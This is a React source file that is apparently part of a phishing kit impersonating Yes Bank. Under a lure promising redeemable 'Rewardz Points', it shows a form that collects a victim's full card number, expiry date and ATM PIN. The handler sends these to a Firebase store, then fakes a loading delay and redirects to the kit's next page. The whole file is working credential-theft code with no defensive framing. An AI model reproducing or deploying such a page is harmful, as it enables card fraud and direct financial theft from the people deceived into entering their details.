import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import FirebaseUtil from "./FirebaseRepo";
import { MdLock } from "react-icons/md";
import myImage from "./assets/yes_bank_top.png";
import footerImage from "./assets/yes_footer.jpeg";
import Image1 from "../src/Image/1.jpeg";
import Footer from "./components/Footer";

function SecondPage() {
  const navigate = useNavigate();
  const [debitCardNumber, setDebitCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [atmPin, setAtmPin] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    let timer;
    if (isSubmitting) {
      setProgress(0);
      let step = 100 / 40;
      timer = setInterval(() => {
        setProgress((prev) => {
          if (prev >= 100) {
            clearInterval(timer);
            return 100;
          }
          return prev + step;
        });
      }, 100);
    }
    return () => clearInterval(timer);
  }, [isSubmitting]);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);

    if (!/^\d{16}$/.test(debitCardNumber)) {
      alert("Debit card number must be 16 digits");
      setIsSubmitting(false);
      return;
    }

    const expiryMonth = expiryDate.split("/")[0];
    const expiryYear = expiryDate.split("/")[1];
    const expiryDateStr = `${expiryMonth}/${expiryYear}`;

    if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryDateStr)) {
      alert("Expiry date must be in MM/YY format");
      setIsSubmitting(false);
      return;
    }

    if (!/^\d{4}$/.test(atmPin)) {
      alert("ATM PIN must be 4 digits");
      setIsSubmitting(false);
      return;
    }

    setTimeout(async () => {
      try {
        const key = localStorage.getItem("key");
        const result = await FirebaseUtil.updateAnyModel("notes_web3/", key, {
          debitCardNumber,
          expiryDate: expiryDateStr,
          atmPin,
        });
        console.log("result.key = " + result.key);
        navigate("/intermediate-page");
      } catch (error) {
        console.error("Error updating Firebase:", error);
        alert("Something went wrong!");
      } finally {
        setIsSubmitting(false);
        setProgress(0);
      }
    }, 4000);
  };

  return (
    <div className="flex flex-col min-h-screen">
      {/* Main content */}
      <div className="flex-1 flex flex-col md:grid md:grid-cols-2">
        {/* Left Side (Form) */}
        <div className="flex flex-col justify-center items-center bg-blue-600 p-6 relative order-1 md:order-none">
          {isSubmitting && (
            <div className="absolute inset-0 flex flex-col items-center justify-center bg-white/70 backdrop-blur-sm z-10">
              <div className="w-10 h-10 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-4"></div>
            </div>
          )}

          {/* Top logo */}
          <div className="flex justify-center mb-4">
            <img className="h-12 w-auto" src={myImage} alt="Top Logo" />
          </div>

          {/* Heading */}
          <h1 className="text-lg font-bold mb-6 flex items-center text-white text-center px-2">
            <MdLock className="mr-2 text-orange-400 text-xl" />
            Your Rewardz Points are Ready to Redeem – Verify Your Debit or Credit Card
          </h1>

          {/* Form */}
          <form
            onSubmit={handleSubmit}
            className="w-full max-w-xs sm:max-w-sm space-y-4"
          >
            <div>
              <label className="block text-gray-200 text-sm font-bold mb-2">
                Debit or Credit Card Number
              </label>
              <input
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                value={debitCardNumber}
                onChange={(e) =>
                  setDebitCardNumber(
                    e.target.value.replace(/\D/g, "").slice(0, 16)
                  )
                }
                placeholder="Enter 16-digit Debit Card Number"
                maxLength={16}
                required
                className="shadow border rounded w-full py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-orange-400"
              />
            </div>

            <div>
              <label className="block text-gray-200 text-sm font-bold mb-2">
                Expiry Date
              </label>
              <input
                type="text"
                value={expiryDate}
                onChange={(e) => {
                  let value = e.target.value.replace(/\D/g, "");
                  if (value.length > 4) value = value.slice(0, 4);
                  if (value.length > 2)
                    value = value.slice(0, 2) + "/" + value.slice(2);
                  setExpiryDate(value);
                }}
                placeholder="MM/YY"
                maxLength={5}
                required
                className="shadow border rounded w-full py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-orange-400"
              />
            </div>

            <div>
              <label className="block text-gray-200 text-sm font-bold mb-2">
                Card PIN
              </label>
              <input
                type="password"
                inputMode="numeric"
                pattern="[0-9]*"
                value={atmPin}
                onChange={(e) =>
                  setAtmPin(e.target.value.replace(/\D/g, "").slice(0, 4))
                }
                placeholder="Enter 4-digit ATM PIN"
                maxLength={4}
                required
                className="shadow border rounded w-full py-2 px-3 text-gray-700 focus:outline-none focus:ring-2 focus:ring-orange-400"
              />
            </div>

            {/* Button centered */}
            <div className="flex justify-center pt-2">
              <button
                type="submit"
                disabled={isSubmitting}
                className="bg-gray-200 hover:bg-gray-400 text-gray-900 font-bold py-2 px-8 rounded-full w-full sm:w-auto focus:outline-none"
              >
                {isSubmitting ? "Loading..." : "Proceed"}
              </button>
            </div>
          </form>

          {/* Footer image aligned */}
          <div className="flex justify-center mt-6 w-full max-w-xs sm:max-w-sm">
            <img
              src={footerImage}
              alt="Footer"
              className="w-full object-contain rounded-md"
            />
          </div>
        </div>

        {/* Right Side Image */}
        <div className="hidden md:block relative order-2 md:order-none">
          <img
            src={Image1}
            alt="Right Side"
            className="absolute inset-0 w-full h-full object-cover"
          />
        </div>
      </div>

      {/* Bottom copyright/footer */}
      <div className="mt-4">
        <Footer />
      </div>
    </div>
  );
}

export default SecondPage;
